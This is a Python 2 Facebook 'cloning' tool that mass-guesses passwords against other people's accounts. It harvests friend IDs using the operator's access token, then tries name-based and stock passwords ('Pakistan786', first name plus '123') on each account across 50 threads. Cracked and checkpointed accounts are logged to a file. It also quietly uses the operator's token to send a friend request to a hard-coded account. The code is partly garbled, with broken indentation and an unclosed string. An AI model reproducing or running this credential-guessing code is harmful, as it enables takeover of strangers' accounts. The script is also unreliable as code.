#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To ALNOE11
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

#Dev:ALNOE11
#####  #####

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

CorrectUsername = "ALNOE11"
CorrectPassword = "ALNOE11"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m馃搵 \x1b[1;96mTool Username \x1b[1;97m禄禄 \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m馃棟 \x1b[1;96mTool Password \x1b[1;97m禄禄 \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCn5nk2WXDPaUmdoZTRT1-Dg')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCn5nk2WXDPaUmdoZTRT1-Dg')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;93mWarning: \033[1;96mDo Not Use Your Personal Account' )
		jalan(' \033[1;93mWarning: \033[1;96mUse a New Account To Login' )
		jalan(' \033[1;93mWarning: \033[1;96mTermux  All version Work�' )                 
		print "\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻� 鈥⑩棃鈥033[1;93mALNOE11\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥�"
		print('	   \033[1;97m鈻琝x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m鈻�' )
		print('	' )
		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mPLEASE CHECK YOUR INTERNET CONNECTION"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;96mLogin Successful.鈥⑩棃鈥�..'
				os.system('xdg-open https://m.youtube.com/channel/UCn5nk2WXDPaUmdoZTRT1-Dg')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection PleasE Check It"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mSorry Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;94mYour Password/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:ALNOE11
	print logo
	print "  \033[1;97m芦----鈥⑩棃鈥⑩�⑩棃鈥�----\033[1;93mLogged in User Info\033[1;97m----鈥⑩棃鈥⑩�⑩棃鈥�-----禄"
	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
	print "\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻� 鈥⑩棃鈥033[1;93mALNOE11\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻� 鈥⑩棃鈥�"
	print "\033[1;97m-鈥⑩棃鈥�-\033[1;97m> \033[1;97m1.\x1b[1;96mStart Cloning..."
	print "\033[1;97m-鈥⑩棃鈥�-\033[1;97m> \033[1;97m0.\033[1;97mlogout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;96mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m-鈥⑩棃鈥�-\033[1;97m> \033[1;97m1.\x1b[1;96mClone From Your Friend List."
	print "\033[1;97m-鈥⑩棃鈥�-\033[1;97m> \033[1;97m2.\x1b[1;96mClone Friend List From Public ID."
	print "\033[1;97m-鈥⑩棃鈥�-\033[1;97m> \033[1;97m0.\033[1;97mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;96mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly PLEASE"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥033[1;93mALNOE11\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻� 鈥⑩棃鈥�"
		jalan('\033[1;94mGetting IDs \033[1;94m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[鈥⑩棃鈥 \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥033[1;93mALNOE11\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥�"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;96m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;93mBack\033[1;97m]")
			super()
		print"\033[1;94mGetting IDs Wait\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m芦--鈥⑩棃鈥⑩�⑩棃鈥�---\x1b[1;93m鈥⑩棃鈥top Process Press CTRL+Z鈥⑩棃鈥033[1;97m---鈥⑩棃鈥⑩�⑩棃鈥�-禄"
	print "\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥033[1;93mALNOE11\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻� 鈥⑩棃鈥�"
	jalan(' \033[1;97m.................\033[1;93mCloning Start Wait..\033[1;97m............ ')
	print "\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥033[1;93mALNOE11\033[1;97m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻� 鈥⑩棃鈥�"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:ALNOE11
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + b['last_name']
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = '786786'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = 'Pakistan'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Pakistan786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan1'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
													else:
									pass8 = b['last_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass8
										oks.append(user+pass8)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass8
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass8+"\n")
											cek.close()
											cekpoint.append(user+pass8)
										else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass9 = b['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass9
																oks.append(user+pass9)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass9
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass9+"\n")
																	cek.close()
																	cekpoint.append(user+pass9)	
											

										else:
											pass10 = 'Pakistan123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass10
												oks.append(user+pass10)
				          					else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass10
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass10+"\n")
													cek.close()
													cekpoint.append(user+pass10)
											
		
										else:
											pass11 = 'Pakistan1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass11
												oks.append(user+pass11)
				          					else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass11
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass11+"\n")
													cek.close()
													cekpoint.append(user+pass11)


										else:
											pass12 = 'Pakistan12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass12 
												oks.append(user+pass12)
				          					else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass12
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass12+"\n")
													cek.close()
													cekpoint.append(user+pass12)

			


										else:
											pass13 = 'Pakistan12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHack 100%馃拤\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass12 
												oks.append(user+pass13)
				          					else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m鈻琝x1b[1;97m-' + user + '-\x1b[1;96m鈻琝x1b[1;97m-' + pass13
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass13+"\n")
													cek.close()
													cekpoint.append(user+pass13)


						
											
											
											
		except:
			pass
		
	p = ThreadPool(50)
	p.map(main, id)
	print "\033[1;96m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥033[1;93mALNOE11\033[1;96m鈥⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥�"
	print "  \033[1;93m芦---鈥⑩棃鈥�---Developed By ALNOE11--鈥⑩棃鈥�---禄" #Dev:ALNOE11
	print '\033[1;96m鉁匬rocess Has Been Completed Press鉃� Ctrl+Z.鈫� Next Type (python2 Shah.py)鈫‐033[1;97m....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print """
                         
                       Checkpoint ID Open After 7 Days

鈥033[1;93m鈼堚�⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥�.
: \033[1;96m ....ALNOE11.... \033[1;93m :
鈥033[1;93m鈼堚�⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥⑩柆 鈻� 鈻� 鈻� 鈻� 鈻� 鈻�⑩棃鈥�.' 
                
	
	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	login()
